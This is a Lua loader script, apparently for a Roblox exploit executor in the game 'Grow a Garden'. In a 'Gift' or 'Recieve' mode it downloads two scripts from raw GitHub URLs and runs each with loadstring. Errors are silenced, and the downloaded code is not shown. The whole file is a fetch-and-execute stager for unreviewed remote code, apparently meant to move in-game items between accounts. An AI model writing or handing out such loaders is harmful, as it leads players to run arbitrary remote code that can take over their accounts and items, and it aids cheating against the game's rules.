-- Ensure the game is fully loaded before running anything
if not game:IsLoaded() then
    repeat game.Loaded:Wait() until game:IsLoaded()
end
local type = "Gift"
local TeleportService = game:GetService("TeleportService")
local PlaceId         = game.PlaceId
local JobId           = game.JobId
local player      = game:GetService("Players").LocalPlayer

local urls

if type == "Recieve" then
    urls = {
        "https://raw.githubusercontent.com/Duyy-2006/Grow-A-Garden-Gift/refs/heads/main/telechar",
        "https://raw.githubusercontent.com/Duyy-2006/Grow-A-Garden-Gift/refs/heads/main/change",
    }
elseif type == "Gift" then
    urls = {
        "https://raw.githubusercontent.com/Duyy-2006/Grow-A-Garden-Gift/refs/heads/main/change_recieve",
        "https://raw.githubusercontent.com/Duyy-2006/Grow-A-Garden-Gift/refs/heads/main/Recieve",
    }
end

for _, url in ipairs(urls) do
    local ok, chunkOrErr = pcall(game.HttpGet, game, url)
    if not ok then
        --player:Kick("Error")
        return
    end

    local fn, loadErr = loadstring(chunkOrErr)
    if not fn then
        --player:Kick("Error")
        return
    end

    -- Run each module in its own thread so a blocking loop inside one
    -- won't stop the others from loading.
    task.spawn(function()
        local success, runErr = pcall(fn)
        if not success then
            --player:Kick("Error")
        end
    end)
end
